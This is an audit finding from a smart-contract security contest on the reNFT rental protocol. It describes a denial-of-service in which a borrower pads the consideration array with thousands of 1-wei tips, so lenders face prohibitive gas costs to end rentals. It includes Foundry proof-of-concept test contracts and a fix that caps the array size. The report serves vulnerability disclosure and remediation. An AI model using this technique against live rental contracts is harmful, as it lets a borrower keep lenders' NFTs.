# [H] An attacker can hijack rentals indefinitely because no validation exists on the consideration item array size, allowing for DoS exploitation via the tipping feature

## Summary
Severity: High
Chain: Smart contract
Component: 2024-02-renft-mitigation
Published: 2024-03-04
Source: https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/28
Type: code-finding

## Details
# Lines of code

https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L334


# Vulnerability details

# Pre-requisite knowledge & an overview of the features in question

1. **Seaport Tipping feature**: Seaport allows for "tipping" in the form of ERC20 tokens as part of the order fulfillment process. You, as a fulfiller, can tip ERC20 tokens to an order by extending the `consideration` array in the order with the additional ERC20 tokens you want to tip.


# Rental registeration and termination execution flow

1. To fulfill a renter and get it to be registered, one of the entry points to the application is the function [`fulfillAdvancedOrder`](https://github.com/re-nft/seaport-core/blob/cbe841804b69dee8e23882b3ae9efcbd4cbec31b/src/lib/Consideration.sol#L225) in Seaport. You run this function and feed it with order you would like to fulfill.

2. Once [`fulfillAdvancedOrder`](https://github.com/re-nft/seaport-core/blob/cbe841804b69dee8e23882b3ae9efcbd4cbec31b/src/lib/Consideration.sol#L225) is called, two things will happen: 
    1. Firstly, the Seaport conduit (contract responsible for token transfers) will transfer both the `offer` and `consideration` items will be sent to the `Create` policy
    2. Secondly, Seaport will call the zone associated with the order, which will be the [`Create`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L47) policy, and the function [`Create::validateOrder`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L819) will be called. From there, the rental registeration begins

3. [`Create::validateOrder`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L819) will verify the calldata supplied to [`Create::validateOrder`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L819) to ensure it has not been tampered with in a malicious way and then it will call the internal function [`Create::_rentFromZone`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L573) which will begin the actual rental registeration process.

4. [`Create::_rentFromZone`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L573) will begin it's execution by executing a couple of checks like [ensure the order type is `FULL_RESTRICED`](_isValidSeaportOrderType) and then it will check if the order is of `BASE` or `PAY` type. We're concerned with `BASE` type, so let's see how would that work.

5. After determining that the order is a `BASE` order, it will register the rental in the [`Storage.sol`](https://github.com/re-nft/smart-contracts/blob/main/src/modules/Storage.sol) contract which holds most of the state of the protocol, it will transfer all the ERC20 consideration items to the payment escrow and it will transfer all the ERC721 and ERC1155 tokens to the rental safe of the fulfiller. Hooks will also be added, if the lender specified any.

6. The rental order will start.

7. `BASE` orders can't be terminated prior to it's expiration date. If it's expiration date has passed, then anybody can stop the rental, be it the lender or the borrower.

8. Once the order expires, the lender will terminate it's execution by calling [`Stop:stopRent()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Stop.sol#L263) function and supplying it with the `RentalOrder` struct of the order to terminate.

9. When the [`Stop:stopRent()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Stop.sol#L263) execution begins, it'll first validate if the rental can be stopped (ie. expired or not), then it'll remove the rental order state from the [`Storage.sol`](https://github.com/re-nft/smart-contracts/blob/main/src/modules/Storage.sol) contract by calling the function [`Storage::removeRentals()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/modules/Storage.sol#L247) and supplying it with the rental order details. Then it'll begin the settlement process.

10. The settlement process will begin. [`Storage::removeRentals()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/modules/Storage.sol#L247) will iterate through all the rented ERC721/1155 items in the order and transfer each token from the borrower's rental safe back to the lender through the function [`Stop::_reclaimRentedItems()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Stop.sol#L356), and then the payment settlement process will begin executing by calling the [`PaymentEscrow::settlePayment()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/modules/PaymentEscrow.sol#L295). The consideration ERC20 tokens associated with the order which were held in the Payment Escrow will then be released and sent to the lender.



# The vulnerability

Looking at the function [`_convertToItems`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L456) in [`Create.sol`](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Create.sol)

```solidity

    function _convertToItems(
        SpentItem[] memory offers,
        ReceivedItem[] memory considerations,
        OrderType orderType
    ) internal pure returns (Item[] memory items) {
        // Initialize an array of items.
        items = new Item[](offers.length + considerations.length);

        // Process items for a base order.
        if (orderType.isBaseOrder()) {
            // Process offer items.
            _processBaseOrderOffer(items, offers, 0);

            // Process consideration items.
            _processBaseOrderConsideration(items, considerations, offers.length);
        }
        ...........

```


and looking at the function [`_processBaseOrderOffer`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L203) in [`Create.sol`](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Create.sol)

```solidity

    function _processBaseOrderConsideration(
        Item[] memory rentalItems,
        ReceivedItem[] memory considerations,
        uint256 startIndex
    ) internal pure {
        // Must be at least one consideration item.
        if (considerations.length == 0) {
            revert Errors.CreatePolicy_ConsiderationCountZero();
        }

        // Process each consideration item.
        for (uint256 i; i < considerations.length; ++i) {
            // Get the consideration item.
            ReceivedItem memory consideration = considerations[i];

            // Only process an ERC20 item.
            if (!consideration.isERC20()) {
                revert Errors.CreatePolicy_SeaportItemTypeNotSupported(
                    consideration.itemType
                );
            }

            // An ERC20 consideration item is considered a payment to the lender upon
            // expiration of the rental order.
            rentalItems[i + startIndex] = Item({
                itemType: ItemType.ERC20,
                settleTo: SettleTo.LENDER,
                token: consideration.token,
                amount: consideration.amount,
                identifier: consideration.identifier
            });
        }
    }

```

It is evident that there is no check if the consideration array size is bigger than a defined threshold, essentially it can be of unlimited size. This allows an attacker to tip thousands of `1 wei` worth of ERC20 tokens, pay a hefty sum of money in gas and get to keep the tokens he rented as long as the lender does not pay ~50% of what the attacker has paid in gas, in order to stop the rental.


## Rental creation & termination: Gas analysis

Rental creation ([`Create::validateOrder`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L819)) -> is on average 2.20x as expensive as rental termination ([`Stop::stopRent()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Stop.sol#L263)) (gas wise). 

Let's take an example of an order with 1 offer item and 5000 consideration items.

In foundry tests, this order will cost `334,152,383` gas during rental creation, and it will cost `153,426,081` gas to terminate it.

To see for yourself, add the following file to your `tests/` folder and run the following command `forge test --mt test_analyzeGasUsage -vv`:
<details>
<summary><b>GasAnalysis.sol</b></summary>
<br>


    // SPDX-License-Identifier: BUSL-1.1
    pragma solidity ^0.8.20;

    import {
        Order,
        FulfillmentComponent,
        Fulfillment,
        ItemType as SeaportItemType,
        CriteriaResolver,
        AdvancedOrder,
        OfferItem,
        ConsiderationItem,
        OrderComponents,
        OrderType as SeaportOrderType,
        OrderParameters,
        ItemType
    } from "@seaport-types/lib/ConsiderationStructs.sol";

    import {
        ZoneParameters
    } from "@seaport-core/lib/rental/ConsiderationStructs.sol";

    import {
        OfferItemLib,
        OrderComponentsLib,
        ConsiderationItemLib,
        OrderLib
    } from "@seaport-sol/SeaportSol.sol";

    import {Seaport} from "@seaport-core/Seaport.sol";
    import {ZoneInterface} from "@src/interfaces/IZone.sol";
    import {Zone} from "@src/packages/Zone.sol";
    import {TokenReceiver} from "@src/packages/TokenReceiver.sol";
    import {Errors} from "@src/libraries/Errors.sol";
    import {ISafe} from "@src/interfaces/ISafe.sol";

    import {OrderType, OrderMetadata, RentalOrder} from "@src/libraries/RentalStructs.sol";
    import {Events} from "@src/libraries/Events.sol";
    import {ECDSA} from "@openzeppelin-contracts/utils/cryptography/ECDSA.sol";

    import {ERC721} from '@openzeppelin-contracts/token/ERC721/ERC721.sol';
    import {IERC721} from '@openzeppelin-contracts/token/ERC721/IERC721.sol';
    import {Ownable} from "@openzeppelin-contracts/access/Ownable.sol";
    import {ERC1155} from '@openzeppelin-contracts/token/ERC1155/ERC1155.sol';
    import {IERC1155} from '@openzeppelin-contracts/interfaces/IERC1155.sol';
    import {IERC20} from '@openzeppelin-contracts/interfaces/IERC20.sol';

    import {ProtocolAccount} from "@test/utils/Types.sol";
    import {BaseTest} from "@test/BaseTest.sol";
    import {Assertions} from "@test/utils/Assertions.sol";
    import {Constants} from "@test/utils/Constants.sol";
    import {SafeUtils} from "@test/utils/GnosisSafeUtils.sol";
    import {Enum} from "@safe-contracts/common/Enum.sol";

    import "forge-std/console.sol";



    contract Exploit is Assertions, Constants, BaseTest {

        function test_analyzeGasUsage() public {

            // create a BASE order
            createOrder({
                offerer: alice,
                orderType: OrderType.BASE,
                erc721Offers: 1,
                erc1155Offers: 0,
                erc20Offers: 0,
                erc721Considerations: 0,
                erc1155Considerations: 0,
                erc20Considerations: 1
            });

            // finalize the order creation
            (
                Order memory order,
                bytes32 orderHash,
                OrderMetadata memory metadata
            ) = finalizeOrder();

            // create an order fulfillment
            createOrderFulfillment({
                _fulfiller: bob,
                order: order,
                orderHash: orderHash,
                metadata: metadata
            });

            // We acccess baseOrder.advancedOrder to add consideration items
            OrderParameters storage params = ordersToFulfill[0].advancedOrder.parameters;

            for (uint i = 0; i < 5000; i++) {
                params.consideration.push(ConsiderationItem({
                    itemType: ItemType.ERC20,
                    token: address(erc20s[0]),
                    identifierOrCriteria: 0,
                    startAmount: 1 wei,
                    endAmount: 1 wei,
                    recipient: payable(address(create))
                }));
            }

            /** ------------ Analysis of Gas usage during rental creation ------------ */

            uint256 gasBefore = gasleft(); // Track how much gas we have before renting.

            // Fulfill the BASE order
            RentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();

            uint256 gasAfter = gasleft(); // Track how much gas we have left after renting.

            console.log("Gas spent during rental creation: ", (gasBefore - gasAfter));



            /** ------------ Analysis of Gas usage during rental termination ------------ */

            // speed up in time past the rental expiration
            vm.warp(block.timestamp + 750);

            gasBefore = gasleft(); // Track how much gas we have before terminating the rental.
            
            stop.stopRent(rentalOrder);

            gasAfter = gasleft(); // Track how much gas we have left after terminating the rental.

            console.log("Gas spent during rental termination: ", (gasBefore - gasAfter));

        }


    }


</details>
</br>





# Exploit scenario / PoC

1. Alice lists a rental order with the offer item being a APE NFT with id 5 for rental with a duration of 15 days and she wants 100 USDC in exchange (consideration item)
2. Attacker borrows the rental order and during fulfillment, he tips 5000x 0.00000000001 USDC tokens, so that the consideration array would have >= 5000 consideration items. Let's say that TX will cost the attacker 5 ETH (the function [`Create::_rentFromZone`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L573) will iterate through every single entry of the 5000 consideration items and transfer them to the escrow, that's why this will cost so much gas). Then the rental starts.
3. After the rental has expired, alice decides to stop/terminate the rental to get her tokens back, only to be surprised that the call to [`Stop::stopRent()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Stop.sol#L263) reverts and that she will have to pay ~2.27 (5/2.20) ETH to stop the rental and get her tokens back!


# Coded PoC

To run the PoC, you'll need to do the following:

1. You'll need to add this file to the `test/` folder:  
    i. `Exploit.sol` -> File containing the PoC

2. You'll need to run this command:

    `forge test --mt test_considerationList_DoS -vv`


**The files:**

<details>
<summary><b>Exploit.sol</b></summary>
<br>

    // SPDX-License-Identifier: BUSL-1.1
    pragma solidity ^0.8.20;

    import {
        Order,
        FulfillmentComponent,
        Fulfillment,
        ItemType as SeaportItemType,
        CriteriaResolver,
        AdvancedOrder,
        OfferItem,
        ConsiderationItem,
        OrderComponents,
        OrderType as SeaportOrderType,
        OrderParameters,
        ItemType
    } from "@seaport-types/lib/ConsiderationStructs.sol";

    import {
        ZoneParameters
    } from "@seaport-core/lib/rental/ConsiderationStructs.sol";

    import {
        OfferItemLib,
        OrderComponentsLib,
        ConsiderationItemLib,
        OrderLib
    } from "@seaport-sol/SeaportSol.sol";

    import {Seaport} from "@seaport-core/Seaport.sol";
    import {ZoneInterface} from "@src/interfaces/IZone.sol";
    import {Zone} from "@src/packages/Zone.sol";
    import {TokenReceiver} from "@src/packages/TokenReceiver.sol";
    import {Errors} from "@src/libraries/Errors.sol";
    import {ISafe} from "@src/interfaces/ISafe.sol";

    import {OrderType, OrderMetadata, RentalOrder} from "@src/libraries/RentalStructs.sol";
    import {Events} from "@src/libraries/Events.sol";
    import {ECDSA} from "@openzeppelin-contracts/utils/cryptography/ECDSA.sol";

    import {ERC721} from '@openzeppelin-contracts/token/ERC721/ERC721.sol';
    import {IERC721} from '@openzeppelin-contracts/token/ERC721/IERC721.sol';
    import {Ownable} from "@openzeppelin-contracts/access/Ownable.sol";
    import {ERC1155} from '@openzeppelin-contracts/token/ERC1155/ERC1155.sol';
    import {IERC1155} from '@openzeppelin-contracts/interfaces/IERC1155.sol';
    import {IERC20} from '@openzeppelin-contracts/interfaces/IERC20.sol';

    import {ProtocolAccount} from "@test/utils/Types.sol";
    import {BaseTest} from "@test/BaseTest.sol";
    import {Assertions} from "@test/utils/Assertions.sol";
    import {Constants} from "@test/utils/Constants.sol";
    import {SafeUtils} from "@test/utils/GnosisSafeUtils.sol";
    import {Enum} from "@safe-contracts/common/Enum.sol";

    import "forge-std/console.sol";



    contract Exploit is Assertions, Constants, BaseTest {

        function test_considerationList_DoS() public {

            // create a BASE order
            createOrder({
                offerer: alice,
                orderType: OrderType.BASE,
                erc721Offers: 1,
                erc1155Offers: 0,
                erc20Offers: 0,
                erc721Considerations: 0,
                erc1155Considerations: 0,
                erc20Considerations: 1
            });

            // finalize the order creation
            (
                Order memory order,
                bytes32 orderHash,
                OrderMetadata memory metadata
            ) = finalizeOrder();

            // create an order fulfillment
            createOrderFulfillment({
                _fulfiller: bob,
                order: order,
                orderHash: orderHash,
                metadata: metadata
            });

            // We acccess baseOrder.advancedOrder to add consideration items
            OrderParameters storage params = ordersToFulfill[0].advancedOrder.parameters;

            for (uint i = 0; i < 3000; i++) {
                params.consideration.push(ConsiderationItem({
                    itemType: ItemType.ERC20,
                    token: address(erc20s[0]),
                    identifierOrCriteria: 0,
                    startAmount: 1 wei,
                    endAmount: 1 wei,
                    recipient: payable(address(create))
                }));
            }

            // Fulfill the BASE order
            RentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();

            /** ------------ Proof of exploitation ------------ */

            // speed up in time past the rental expiration
            vm.warp(block.timestamp + 750);
            
            // We expect the call to revert, because the gas the victim `alice` supplied isn't enough!
            vm.expectRevert();
            stop.stopRent{gas: 10000000}(rentalOrder);


        }


    }


</details>


<br>

# Coded Remediation

One easy way is to limit how many items can be in a consideration item list of a `BASE` order. You can enforce such limit by doing the following

In the function [`_processBaseOrderConsideration()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L334) in the [`Create.sol`](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Create.sol) contract, replace the first `if check`

```solidity
        // Must be at least one consideration item.
        if (considerations.length == 0) {
            revert Errors.CreatePolicy_ConsiderationCountZero();
        }
```
with

```solidity
        // Must be at least one consideration item.
        if (considerations.length == 0 || considerations.length > 50) {
            revert Errors.CreatePolicy_ConsiderationCountZero();
        }
```







## Assessed type

DoS
